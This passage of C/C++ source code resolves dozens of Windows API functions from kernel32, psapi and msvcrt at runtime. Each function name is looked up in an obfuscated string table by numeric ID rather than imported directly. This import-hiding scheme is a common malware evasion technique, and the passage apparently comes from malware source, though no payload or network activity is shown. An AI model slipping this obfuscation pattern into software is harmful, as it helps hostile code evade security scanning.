	OpenMutex = (MyOpenMutexA) GetProcAddress(hModule_Kernel32, m_MyString);

	//ReleaseMutex
	GetMyString(10058, m_MyString, pModuleString, nModuleStringLen);
	ReleaseMutex = (MyReleaseMutex) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateEventA
	GetMyString(10059, m_MyString, pModuleString, nModuleStringLen);
	CreateEvent = (MyCreateEventA) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenEventA
	GetMyString(10060, m_MyString, pModuleString, nModuleStringLen);
	OpenEvent = (MyOpenEventA) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetEvent
	GetMyString(10061, m_MyString, pModuleString, nModuleStringLen);
	SetEvent = (MySetEvent) GetProcAddress(hModule_Kernel32, m_MyString);

	//WaitForSingleObject
	GetMyString(10062, m_MyString, pModuleString, nModuleStringLen);
	WaitForSingleObject = (MyWaitForSingleObject) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetLocalTime
	GetMyString(10063, m_MyString, pModuleString, nModuleStringLen);
	GetLocalTime = (MyGetLocalTime) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetTickCount
	GetMyString(10064, m_MyString, pModuleString, nModuleStringLen);
	GetTickCount = (MyGetTickCount) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrcpyW
	GetMyString(10065, m_MyString, pModuleString, nModuleStringLen);
	lstrcpyW = (MylstrcpyW) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrcatW
	GetMyString(10066, m_MyString, pModuleString, nModuleStringLen);
	lstrcatW = (MylstrcatW) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrlenW
	GetMyString(10067, m_MyString, pModuleString, nModuleStringLen);
	lstrlenW = (MylstrlenW) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrcmpW
	GetMyString(10068, m_MyString, pModuleString, nModuleStringLen);
	lstrcmpW = (MylstrcmpW) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateThread
	GetMyString(10069, m_MyString, pModuleString, nModuleStringLen);
	CreateThread = (MyCreateThread) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetSystemDirectoryA
	GetMyString(10070, m_MyString, pModuleString, nModuleStringLen);
	GetSystemDirectory = (MyGetSystemDirectoryA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetDiskFreeSpaceExA
	GetMyString(10195, m_MyString, pModuleString, nModuleStringLen);
	GetDiskFreeSpaceEx = (MyGetDiskFreeSpaceExA) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateDirectoryA
	GetMyString(10109, m_MyString, pModuleString, nModuleStringLen);
	CreateDirectory = (MyCreateDirectoryA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetVolumeInformationA
	GetMyString(10111, m_MyString, pModuleString, nModuleStringLen);
	GetVolumeInformation = (MyGetVolumeInformationA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetFileAttributesExA
	GetMyString(10116, m_MyString, pModuleString, nModuleStringLen);
	GetFileAttributesEx = (MyGetFileAttributesExA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetDriveTypeA
	GetMyString(10115, m_MyString, pModuleString, nModuleStringLen);
	GetDriveType = (MyGetDriveTypeA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentProcess
	GetMyString(10071, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentProcess = (MyGetCurrentProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenProcess
	GetMyString(10072, m_MyString, pModuleString, nModuleStringLen);
	OpenProcess = (MyOpenProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//MultiByteToWideChar
	GetMyString(10073, m_MyString, pModuleString, nModuleStringLen);
	MultiByteToWideChar = (MyMultiByteToWideChar) GetProcAddress(hModule_Kernel32, m_MyString);

	//WideCharToMultiByte
	GetMyString(10074, m_MyString, pModuleString, nModuleStringLen);
	WideCharToMultiByte = (MyWideCharToMultiByte) GetProcAddress(hModule_Kernel32, m_MyString);

	//Sleep
	GetMyString(10075, m_MyString, pModuleString, nModuleStringLen);
	Sleep = (MySleep) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateFileA
	GetMyString(10076, m_MyString, pModuleString, nModuleStringLen);
	CreateFile = (MyCreateFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//DeleteFileA
	GetMyString(10077, m_MyString, pModuleString, nModuleStringLen);
	DeleteFile = (MyDeleteFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//WriteFile
	GetMyString(10078, m_MyString, pModuleString, nModuleStringLen);
	WriteFile = (MyWriteFile) GetProcAddress(hModule_Kernel32, m_MyString);

	//ReadFile
	GetMyString(10079, m_MyString, pModuleString, nModuleStringLen);
	ReadFile = (MyReadFile) GetProcAddress(hModule_Kernel32, m_MyString);

	//CopyFileA
	GetMyString(10080, m_MyString, pModuleString, nModuleStringLen);
	CopyFile = (MyCopyFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//MoveFileA
	GetMyString(10110, m_MyString, pModuleString, nModuleStringLen);
	MoveFile = (MyMoveFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetFilePointer
	GetMyString(10081, m_MyString, pModuleString, nModuleStringLen);
	SetFilePointer = (MySetFilePointer) GetProcAddress(hModule_Kernel32, m_MyString);

	//CloseHandle
	GetMyString(10082, m_MyString, pModuleString, nModuleStringLen);
	CloseHandle = (MyCloseHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetModuleFileNameA
	GetMyString(10083, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileName = (MyGetModuleFileNameA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetVersionExA
	GetMyString(10084, m_MyString, pModuleString, nModuleStringLen);
	GetVersionEx = (MyGetVersionExA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetVersion
	GetMyString(10085, m_MyString, pModuleString, nModuleStringLen);
	GetVersion = (MyGetVersion) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentThreadId
	GetMyString(10086, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentThreadId = (MyGetCurrentThreadId) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetFileSize
	GetMyString(10087, m_MyString, pModuleString, nModuleStringLen);
	GetFileSize = (MyGetFileSize) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetTempPathA
	GetMyString(10088, m_MyString, pModuleString, nModuleStringLen);
	GetTempPath = (MyGetTempPathA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetLogicalDriveStringsA
	GetMyString(10108, m_MyString, pModuleString, nModuleStringLen);
	GetLogicalDriveStrings = (MyGetLogicalDriveStringsA) GetProcAddress(hModule_Kernel32, m_MyString);

//Psapi.dll
	GetMyString(10089, m_MyString, pModuleString, nModuleStringLen);
	hModule_Psapi = LoadLibrary(m_MyString);

	//GetModuleFileNameExA
	GetMyString(10090, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileNameEx = (MyGetModuleFileNameExA) GetProcAddress(hModule_Psapi, m_MyString);

	//EnumProcesses
	GetMyString(10091, m_MyString, pModuleString, nModuleStringLen);
	EnumProcesses = (MyEnumProcesses) GetProcAddress(hModule_Psapi, m_MyString);

//MSVCRT.dll
	GetMyString(10104, m_MyString, pModuleString, nModuleStringLen);
	hModule_MSVCRT = LoadLibrary(m_MyString);

	//sprintf
	GetMyString(10105, m_MyString, pModuleString, nModuleStringLen);
	sprintf = (Mysprintf) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memcmp
	GetMyString(10106, m_MyString, pModuleString, nModuleStringLen);
	memcmp = (Mymemcmp) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memcpy
	GetMyString(10107, m_MyString, pModuleString, nModuleStringLen);
	memcpy = (Mymemcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memset
	GetMyString(10103, m_MyString, pModuleString, nModuleStringLen);
	memset = (Mymemset) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strstr
	GetMyString(10092, m_MyString, pModuleString, nModuleStringLen);
	strstr = (Mystrstr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strchr
	GetMyString(10093, m_MyString, pModuleString, nModuleStringLen);
	strchr = (Mystrchr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcat
	GetMyString(10094, m_MyString, pModuleString, nModuleStringLen);
	strcat = (Mystrcat) GetProcAddress(hModule_MSVCRT, m_MyString);

	//atoi
	GetMyString(10095, m_MyString, pModuleString, nModuleStringLen);
	atoi = (Myatoi) GetProcAddress(hModule_MSVCRT, m_MyString);

	//srand
	GetMyString(10096, m_MyString, pModuleString, nModuleStringLen);
	srand = (Mysrand) GetProcAddress(hModule_MSVCRT, m_MyString);

	//rand
	GetMyString(10097, m_MyString, pModuleString, nModuleStringLen);
	rand = (Myrand) GetProcAddress(hModule_MSVCRT, m_MyString);

	//time
	GetMyString(10098, m_MyString, pModuleString, nModuleStringLen);
	time = (Mytime) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strrchr
	GetMyString(10099, m_MyString, pModuleString, nModuleStringLen);
	strrchr = (Mystrrchr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strlen
	GetMyString(10100, m_MyString, pModuleString, nModuleStringLen);
	strlen = (Mystrlen) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcpy
	GetMyString(10101, m_MyString, pModuleString, nModuleStringLen);
	strcpy = (Mystrcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcmp
	GetMyString(10102, m_MyString, pModuleString, nModuleStringLen);
	strcmp = (Mystrcmp) GetProcAddress(hModule_MSVCRT, m_MyString);
	return TRUE;
}
